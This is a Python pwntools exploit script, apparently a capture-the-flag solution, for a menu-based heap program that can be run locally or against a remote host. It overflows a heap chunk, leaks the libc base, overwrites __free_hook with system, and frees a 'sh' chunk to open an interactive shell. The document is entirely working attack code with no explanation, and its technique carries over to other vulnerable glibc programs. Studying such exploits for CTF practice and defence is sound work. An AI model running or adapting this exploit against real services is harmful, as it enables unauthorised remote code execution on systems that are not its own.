#!/usr/bin/python3
# -*- coding: UTF-8 -*-
# -----------------------------------
# @File    :  exp.py
# @Author  :  woodwhale
# @Time    :  2021/10/03 14:37:20
# -----------------------------------

from pwn import *
from LibcSearcher import *
import sys, subprocess

arglen = len(sys.argv)
def ret2libc(leak,func,binary=null):
    libc = LibcSearcher(func,leak) if binary == null else binary
    base = leak - libc.dump(func) if binary == null else leak - libc.sym[func]
    system = base + libc.dump('system') if binary == null else base + libc.sym['system']
    binsh = base + libc.dump('str_bin_sh') if binary == null else next(libc.search(b'/bin/sh'))
    return (system,binsh)

s = lambda data : io.send(data)
sa = lambda rv,data : io.sendafter(rv,data)
sl = lambda data : io.sendline(data)
sla = lambda rv,data : io.sendlineafter(rv,data)
r = lambda num : io.recv(num)
rl = lambda keepends=True : io.recvline(keepends)
ru = lambda data,drop=True : io.recvuntil(data,drop)
ia = lambda : io.interactive()
uu32 = lambda data : u32(data.ljust(4,b'\x00'))
uu64 = lambda data : u64(data.ljust(8,b'\x00'))
i16 = lambda data : int(data,16)
leak = lambda name,addr : log.success('\033[33m{}\033[0m = \033[31m{:#x}\033[0m'.format(name, addr))
dbg = lambda point=null: (gdb.attach(io) if point == null else gdb.attach(io,f'b {point}')) if DEBUG else null
og = lambda binary : list(map(int,subprocess.check_output(['one_gadget','--raw','-f',binary]).decode().strip('\n').split(' ')))
rg = lambda binary,only,grep : i16(subprocess.check_output([f"ROPgadget --binary {binary} --only '{only}' | grep {grep}"],shell=True).decode().split(' ')[0])
set_libcaddr = lambda leak,func : leak - libc.sym[func]
libcpath = lambda binary : subprocess.check_output(['ldd',binary]).decode().replace('\t', '').split('\n')[1].split(' ')[2] if GLIBC else subprocess.check_output(['ls | grep *.so'],shell=True).decode().replace('\n', '')
proc = lambda binary,libc=null : process(binary) if GLIBC else process(binary,env={'LD_PRELOAD':'./'+libc})

# context.arch='amd64'
# context.log_level='debug'

# 0直接略过所有dbg
DEBUG = 1
# 0表示使用当前目录下的libc，1表示使用patcher之后的glibc
GLIBC = 1
binary = './main'
elf = ELF(binary)
libc = ELF(libcpath(binary))
io = proc(binary,libcpath(binary)) if arglen == 1 else (remote(sys.argv[1].split(':')[0],sys.argv[1].split(':')[1]) if arglen == 2 else remote(sys.argv[1],sys.argv[2]))

def add(index,size, content="a"):
    sla(">>", "1")
    sla("idx?",str(index))
    sla("size?",str(size))
    sa("content?",content)

def free(index):
    sla(">>", "2")
    sla("idx?", str(index))

def edit(index, size, content):
    sla(">>", "3")
    sla("idx?", str(index))
    sla("size?", str(size))
    sa("content?", content)

def show(index):
    sla(">>", "4")
    sla("idx?", str(index))

add(0,0x18,"aaaa")

sla(">>",b"1")
sla("idx?",b"0")
sla("size?",b"1919810")

add(1,0x20,"bbbb")
add(2,0x400,"cccc")
add(3,0x18,"dddd")
add(4,0x18,"eeee")

free(1)

payload = p64(0)*3 + p64(0x31) + p64(0)*5 + p64(0x431)
edit(0,0x60,payload)

free(2)
add(5,0x400)
show(5)
ru(": ")
libc.address = uu64(r(6)) - (0x7f735ae79061-0x7f735aa8d000)
leak("base",libc.address)
free_hook = libc.sym["__free_hook"]
system = libc.sym["system"]
binsh = next(libc.search(b"/bin/sh"))
leak("free_hook",free_hook)
leak("system",system)

payload = p64(0)*3 + p64(0x31) + p64(free_hook-0x10)
edit(0,0x40,payload)
dbg()

add(6,0x28)
payload = p64(0)*2 + p64(system)
add(7,0x28,payload)
add(8,0x40,"sh\x00")
free(8)
dbg()

ia()